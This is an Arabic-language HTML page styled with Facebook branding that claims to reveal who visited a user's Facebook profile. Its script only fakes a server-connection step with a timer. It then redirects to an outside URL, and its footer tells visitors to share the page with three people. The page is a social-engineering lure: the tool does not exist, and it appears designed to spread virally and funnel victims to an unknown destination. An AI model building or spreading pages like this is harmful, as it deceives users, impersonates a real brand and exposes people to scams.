<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>كاشف زوار البروفايل 2026</title>

    <meta property="og:title" content="اكتشف من زار ملفك الشخصي">
    <meta property="og:description" content="اضغط هنا لتعرف القائمة الكاملة للأشخاص الذين يشاهدون بروفايلك باستمرار. أداة سريعة ومجانية.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png">
    <meta property="og:type" content="website">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --glass-bg: rgba(255, 255, 255, 0.05);
            --fb-blue: #1877f2;
            --fb-green: #2ecc71;
            --text-light: #f5f6f7;
            --error-red: #ff4d4d;
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0e1013;
            /* الخلفية المطلوبة */
            background-image: url('https://w0.peakpx.com/wallpaper/596/610/HD-wallpaper-whatsapp-dark-backround-doodles-pattern.jpg');
            background-size: cover;
            background-attachment: fixed;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: var(--text-light);
        }

        .glass-card {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 35px;
            padding: 40px 30px;
            width: 90%;
            max-width: 480px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            text-align: center;
        }

        .fb-logo {
            font-size: 90px;
            color: var(--fb-blue);
            filter: drop-shadow(0 0 15px rgba(24, 119, 242, 0.8));
            margin-bottom: 15px;
        }

        h1 {
            font-size: 26px;
            margin-bottom: 35px;
            font-weight: bold;
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        input[type="text"] {
            width: 100%;
            padding: 18px 50px 18px 20px;
            border-radius: 50px;
            border: none;
            background: rgba(255, 255, 255, 0.95);
            color: #1c1e21;
            font-size: 16px;
            outline: none;
            box-sizing: border-box;
        }

        .status-icon {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--error-red);
            font-size: 22px;
            transition: 0.5s ease;
        }

        .status-icon.success {
            color: var(--fb-green);
            transform: translateY(-50%) scale(1.2);
        }

        .server-msg {
            font-size: 13px;
            color: #ccc;
            margin-top: 10px;
            display: none;
        }

        .question-label {
            display: block;
            text-align: right;
            margin: 20px 15px 10px 0;
            font-weight: 600;
            font-size: 16px;
            background: rgba(255,255,255,0.8);
            color: #3b5998;
            padding: 5px 15px;
            border-radius: 20px;
            width: fit-content;
        }

        .options-stack {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .opt-btn {
            background: linear-gradient(145deg, #1877f2, #166fe5);
            color: white;
            border: none;
            padding: 16px 20px;
            border-radius: 15px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 15px;
            font-weight: 500;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        .opt-btn.active {
            background: linear-gradient(145deg, #2ecc71, #27ae60);
        }

        .opt-btn i { opacity: 0; }
        .opt-btn.active i { opacity: 1; }

        #discover-btn {
            width: 100%;
            padding: 20px;
            border-radius: 50px;
            border: none;
            background: #444;
            color: #888;
            font-size: 22px;
            font-weight: bold;
            margin-top: 30px;
            cursor: not-allowed;
            transition: 0.5s;
        }

        #discover-btn.ready {
            background: linear-gradient(to right, #00c6ff, #0072ff);
            color: white;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5);
        }

        .footer-note {
            color: var(--error-red);
            font-size: 13px;
            margin-top: 20px;
            font-weight: bold;
            line-height: 1.6;
        }
    </style>
</head>
<body>

<div class="glass-card">
    <i class="fab fa-facebook fb-logo"></i>
    <h1>من زار ملفي الشخصي؟</h1>

    <div class="input-container">
        <input type="text" id="fb-link" placeholder="ادخل رابط صفحتك على فيسبوك" oninput="processLink()">
        <i class="fas fa-check-circle status-icon" id="main-status"></i>
        <div id="status-text" class="server-msg">جارٍ ربط السيرفر بصفحتك...</div>
    </div>

    <span class="question-label">فترة الزيارة:</span>
    <div class="options-stack">
        <button class="opt-btn" onclick="select(this, 'g1')">اليوم <i class="fas fa-check-circle"></i></button>
        <button class="opt-btn" onclick="select(this, 'g1')">آخر 5 أيام <i class="fas fa-check-circle"></i></button>
    </div>

    <span class="question-label">نوع التقرير:</span>
    <div class="options-stack">
        <button class="opt-btn" onclick="select(this, 'g2')">اسم الزائر فقط <i class="fas fa-check-circle"></i></button>
        <button class="opt-btn" onclick="select(this, 'g2')">التقرير الكامل <i class="fas fa-check-circle"></i></button>
    </div>

    <button id="discover-btn" onclick="goToLink()" disabled>اكتشف الآن</button>
    
    <div class="footer-note">
        ملحوظة: عليك إجتياز اختبار انا لست برنامج روبوت<br>
        وعليك مشاركتها مع ثلاثة اشخاص
    </div>
</div>

<script>
    let linkReady = false, q1Ready = false, q2Ready = false;

    function processLink() {
        const input = document.getElementById('fb-link').value;
        const icon = document.getElementById('main-status');
        const msg = document.getElementById('status-text');
        if(input.length > 10) {
            msg.style.display = 'block';
            setTimeout(() => {
                msg.style.display = 'none';
                icon.classList.add('success');
                linkReady = true;
                updateButtonState();
            }, 2000);
        }
    }

    function select(btn, group) {
        btn.parentElement.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        if(group === 'g1') q1Ready = true;
        if(group === 'g2') q2Ready = true;
        updateButtonState();
    }

    function updateButtonState() {
        const btn = document.getElementById('discover-btn');
        if(linkReady && q1Ready && q2Ready) {
            btn.classList.add('ready');
            btn.disabled = false;
        }
    }

    function goToLink() {
        window.location.href = "https://aping.global.ssl.fastly.net/pages/fba2/?i=274466";
    }
</script>

</body>
</html>
